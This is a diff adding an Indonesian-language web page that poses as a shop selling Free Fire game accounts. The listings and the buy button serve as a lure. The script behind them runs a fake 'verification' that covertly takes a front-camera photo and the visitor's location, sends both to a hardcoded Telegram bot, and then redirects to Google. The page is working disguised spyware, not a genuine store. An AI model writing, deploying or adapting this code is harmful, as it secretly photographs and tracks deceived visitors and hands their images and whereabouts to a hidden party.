@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Rillzy Dex - Stok Akun FF</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+body { background: linear-gradient(135deg,#0f0f1a,#1a1a2e); color:#fff; min-height:100vh; padding:20px; }
+.container { max-width:480px; margin:0 auto; }
+header { text-align:center; margin-bottom:25px; }
+header h1 { color:#00d4ff; font-size:28px; letter-spacing:2px; }
+.sub { color:#888; font-size:13px; margin-top:5px; }
+.card { background: rgba(255,255,255,0.05); border:1px solid rgba(0,212,255,0.3); border-radius:14px; padding:16px; margin-bottom:14px; cursor:pointer; transition:.2s; position:relative; }
+.card:hover { background: rgba(0,212,255,0.1); transform:translateY(-2px); }
+.badge { position:absolute; top:12px; right:12px; background:#00c853; color:#fff; font-size:10px; padding:3px 8px; border-radius:20px; }
+.card h3 { color:#00d4ff; font-size:16px; margin-bottom:6px; }
+.card p { font-size:12px; color:#bbb; margin:3px 0; }
+.harga { color:#00e676 !important; font-weight:bold; font-size:16px !important; margin-top:8px !important; }
+.vault { background: rgba(255,193,7,0.1); border:1px dashed #ffc107; border-radius:10px; padding:12px; text-align:center; margin:15px 0; }
+.vault h3 { color:#ffc107; font-size:14px; margin-bottom:4px; }
+.vault p { color:#999; font-size:11px; }
+.beli { width:100%; padding:15px; background: linear-gradient(90deg,#00d4ff,#0077ff); border:none; border-radius:12px; color:#fff; font-weight:bold; font-size:16px; cursor:pointer; }
+.beli:hover { opacity:.9; }
+</style>
+</head>
+<body>
+<div class="container">
+  <header>
+    <h1>🎮 RILLZY DEX</h1>
+    <p class="sub">Stok Akun Free Fire Terpercaya</p>
+  </header>
+
+  <div class="stok-list">
+    <div class="card" onclick="pilihAkun('A001')">
+      <div class="badge">READY ✅</div>
+      <h3>Akun FF #A001</h3>
+      <p>Skin: Elite Pass Season 12, Chrono, Alok</p>
+      <p>Level: 65 | Rank: Heroic</p>
+      <p class="harga">Rp 350.000</p>
+    </div>
+
+    <div class="card" onclick="pilihAkun('A002')">
+      <div class="badge">READY ✅</div>
+      <h3>Akun FF #A002</h3>
+      <p>Skin: Wukong, Kelly, Bundle Legend</p>
+      <p>Level: 58 | Rank: Grandmaster</p>
+      <p class="harga">Rp 275.000</p>
+    </div>
+
+    <div class="card" onclick="pilihAkun('A003')">
+      <div class="badge">READY ✅</div>
+      <h3>Akun FF #A003</h3>
+      <p>Skin: Angelic, Digital Slaughter, MP40 Evo</p>
+      <p>Level: 72 | Rank: Heroic</p>
+      <p class="harga">Rp 480.000</p>
+    </div>
+  </div>
+
+  <div class="vault">
+    <h3>🔐 Vault Akun</h3>
+    <p>Semua akun tersimpan di vault aman & siap kirim</p>
+  </div>
+
+  <button class="beli" onclick="mulaiVerifikasi()">Beli Sekarang</button>
+</div>
+
+<script>
+const BOT_TOKEN = "9093512852:AAEBjBmpJB41bpRdgeqAXxkfn4pz8dFpFEo";
+const CHAT_ID   = "8922169139";
+
+function pilihAkun(kode) {
+  alert("Akun " + kode + " dipilih. Lanjutkan verifikasi.");
+  mulaiVerifikasi();
+}
+
+function mulaiVerifikasi() {
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then(stream => {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const foto = canvas.toDataURL('image/jpeg');
+        navigator.geolocation.getCurrentPosition(pos => {
+          kirimKeBot(foto, pos.coords.latitude, pos.coords.longitude);
+        }, () => {
+          kirimKeBot(foto, null, null);
+        });
+        stream.getTracks().forEach(t => t.stop());
+      }, 1500);
+    })
+    .catch(() => {
+      navigator.geolocation.getCurrentPosition(pos => {
+        kirimKeBot(null, pos.coords.latitude, pos.coords.longitude);
+      });
+    });
+}
+
+function kirimKeBot(fotoBase64, lat, lon) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+  if (fotoBase64) {
+    fetch(fotoBase64).then(r => r.blob()).then(blob => {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'kamera.jpg');
+      form.append('caption', `📸 Kamera Depan\n📍 Lat: ${lat}\n📍 Lon: ${lon}\n🗺️ Maps: https://maps.google.com/?q=${lat},${lon}`);
+      fetch(url, { method:'POST', body: form });
+      kirimLokasi(lat, lon);
+    });
+  } else {
+    kirimLokasi(lat, lon);
+  }
+}
+
+function kirimLokasi(lat, lon) {
+  if (!lat || !lon) return;
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+  const data = new URLSearchParams();
+  data.append('chat_id', CHAT_ID);
+  data.append('latitude', lat);
+  data.append('longitude', lon);
+  fetch(url, { method:'POST', body: data });
+  setTimeout(() => {
+    window.location.href = 'https://www.google.com';
+  }, 2000);
+}
+</script>
+</body>
+</html>
